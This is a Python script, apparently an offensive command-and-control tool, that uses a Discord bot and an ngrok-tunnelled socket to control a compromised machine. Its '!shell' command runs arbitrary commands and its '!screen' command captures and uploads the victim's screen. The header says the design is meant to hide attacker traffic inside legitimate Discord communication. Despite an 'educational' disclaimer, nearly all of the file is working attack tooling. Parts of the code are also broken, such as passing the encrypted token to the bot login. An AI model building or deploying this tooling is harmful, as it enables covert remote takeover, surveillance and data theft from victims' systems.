# This script integrates Discord API functionality to facilitate communication between the compromised system and the attacker-controlled server, thereby potentially hiding the traffic within legitimate Discord communication.

# This C2 is for simulation only and is still under development
# pip install -r requirements.txt
# python3 Discord-C2.py
# Author: S3N4T0R
# Date: 2024-7-2

# Disclaimer: it's essential to note that this script is for educational purposes only, and any unauthorized use of it could lead to legal consequences.

# This script checks if the Discord bot token and channel ID are provided. If they are, it starts the Discord bot functionalities; otherwise, it proceeds with just the IP and port. This way, the script can continue the connection without the Discord details if they are not entered.

# Importing necessary libraries
import subprocess
import time
import socket
import secrets
import os
import pyautogui
from pyvirtualdisplay import Display
import requests
from Crypto.Cipher import ChaCha20
import discord
from discord.ext import commands


ASCII_BANNER = '''\033[95m
             ⣼⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣿⣿⣶⣦
           ⣵⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶
          ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⣿⣿⣿⣿⣿⣿⣿⣿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿
          ⣿⣿⣿⣿⣿⣿⣿⣿⠛⠩⡐⢄⠢⠙⢋⠍⣉⠛⡙⡀⢆⡈⠍⠛⣿⣿⣿⣿⣿⣿⣿⣿
          ⣿⣿⣿⣿⣿⣿⣿⠃⠌⡡⠐⢂⠡⠉⡄⠊⢄⢂⠡⠐⠂⢌⠘⡰⠘⣿⣿⣿⣿⣿⣿⣿
          ⣿⣿⣿⣿⣿⣿⠃⠌⠒⢠⠑⡨⠄⠃⠤⠉⢄⠢⠌⢡⠉⢄⢂⠡⠒⠸⣿⣿⣿⣿⣿⣿
          ⣿⣿⣿⣿⣿⡏⠤⢉⠰⢁⢢⣶⣾⣧⢂⠩⡀⠆⣼⣶⣮⣄⠂⡂⠍⣂⢹⣿⣿⣿⣿⣿
          ⣿⣿⣿⣿⣿⠁⢆⠨⢐⠂⣿⣿⣿⣿⠇⢂⠱⢸⣿⣿⣿⡿⢀⠂⠅⢢⠘⣿⣿⣿⣿⣿
          ⣿⣿⣿⣿⣿⠌⢠⠂⢡⠊⠌⠛⠟⡋⢌⠂⢅⢂⡙⠿⠛⣁⢂⠉⡄⠃⡌⣿⣿⣿⣿⣿
          ⣿⣿⣿⣿⣿⡨⠄⡘⠄⠎⣔⣉⡐⠌⡐⣈⠂⠆⡐⢂⣡⣤⢂⠡⡐⢡⢐⣿⣿⣿⣿⣿
          ⣿⣿⣿⣿⣿⣿⣶⣥⣘⡐⠨⣽⣿⣿⣷⣶⣾⣾⣿⣿⣯⢁⠢⣐⣤⣷⣿⣿⣿⣿⣿⣿
          ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
           ⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿
             ⠛⠿⢿⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣿⢿⠿⠟⠋
\033[0m'''

# Function to generate a random key for ChaCha20 encryption
def generate_random_key(length):
    return secrets.token_bytes(length)

# Function to encrypt access token using ChaCha20
def encrypt_access_token(token, key_length):
    key = generate_random_key(key_length)
    cipher = ChaCha20.new(key=key)
    encrypted_token = cipher.encrypt(token.encode())
    nonce = cipher.nonce
    return nonce + encrypted_token

# Function to start ngrok tunnel
def start_ngrok(port):
    try:
        ngrok_process = subprocess.Popen(['ngrok', 'tcp', str(port)])
        time.sleep(3)  # Give ngrok some time to start
        return ngrok_process
    except Exception as e:
        print(f"Error starting ngrok: {e}")
        return None

# Function to establish reverse shell connection
def establish_reverse_shell(ip, port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind((ip, int(port)))
        s.listen(1)
        print(f"[!] Waiting for incoming connection on {ip}:{port}...")
        client_socket, addr = s.accept()
        return client_socket, s
    except Exception as e:
        print(f"Error establishing reverse shell: {e}")
        return None, None

# Function to start display for screenshot functionality
def start_display():
    try:
        display = Display(visible=0, size=(800, 600))
        display.start()
        return display
    except Exception as e:
        print(f"Error starting virtual display: {e}")
        return None

# Function to handle Discord bot functionalities
def start_discord_bot(token, channel_id):
    try:
        bot = commands.Bot(command_prefix="!")

        @bot.event
        async def on_ready():
            print("[*] Bot is ready and connected to Discord!")
            channel = bot.get_channel(int(channel_id))
            await channel.send("C2 Bot is now online.")

        @bot.command()
        async def shell(ctx, *, command):
            result = subprocess.run(command, shell=True, capture_output=True, text=True)
            stdout = result.stdout
            stderr = result.stderr

            if stdout:
                await ctx.send(f"Output:\n```{stdout}```")
            if stderr:
                await ctx.send(f"Error:\n```{stderr}```")

        @bot.command()
        async def screen(ctx):
            try:
                screen = pyautogui.screenshot()
                screen.save("screenshot.png")
                await ctx.send(file=discord.File("screenshot.png"))
                os.remove("screenshot.png")
            except Exception as e:
                await ctx.send(f"Error capturing screenshot: {e}")

        bot.run(token)
    except Exception as e:
        print(f"Error starting Discord bot: {e}")

# Main function to run the entire script
def main():
    try:
        print(ASCII_BANNER)
        print("")

        # Input values
        token = input("[+] Enter your Discord bot token (press Enter to skip): ").strip()
        channel_id = input("[+] Enter your Discord channel ID (press Enter to skip): ").strip()
        ip = input("[+] Enter the IP for the reverse shell: ").strip()
        port = input("[+] Enter the port number for the reverse shell and ngrok: ").strip()

        # Validate port number
        if not port.isdigit():
            print("Invalid port number. Exiting.")
            return

        port = int(port)

        # Encrypt token if provided
        encrypted_token = None
        if token and channel_id:
            print("[*] Encrypting Discord token...")
            key_length = 32  # ChaCha20 key length in bytes
            encrypted_token = encrypt_access_token(token, key_length)
            if not encrypted_token:
                print("Error encrypting token. Exiting.")
                return

        # Start ngrok tunnel
        print("[*] Starting ngrok tunnel...")
        ngrok_process = start_ngrok(port)
        if not ngrok_process:
            print("Error starting ngrok. Exiting.")
            return

        # Start reverse shell
        client_socket, server_socket = establish_reverse_shell(ip, port)
        if not client_socket:
            print("Error establishing reverse shell. Exiting.")
            return

        # Start display for screenshot functionality
        display = start_display()
        if not display:
            print("Error starting virtual display. Exiting.")
            return

        # Start Discord bot if token and channel ID are provided
        if token and channel_id:
            print("[*] Starting Discord bot functionalities...")
            start_discord_bot(encrypted_token, channel_id)
        else:
            print("[*] Discord token or channel ID not provided. Running without Discord bot functionalities.")

        # Receive and send commands
        while True:
            try:
                command = input("Enter a command to execute (or type 'exit' to quit): ").strip()
                if command.lower() == "exit":
                    break
                client_socket.send(command.encode())
                response = client_socket.recv(1024).decode()
                print(response)
            except KeyboardInterrupt:
                break

        # Clean up
        if client_socket:
            client_socket.close()
        if server_socket:
            server_socket.close()
        if ngrok_process:
            ngrok_process.kill()
        if display:
            display.stop()
        print("[*] Exiting.")

    except Exception as e:
        print(f"Error in main function: {e}")

if __name__ == "__main__":
    main()
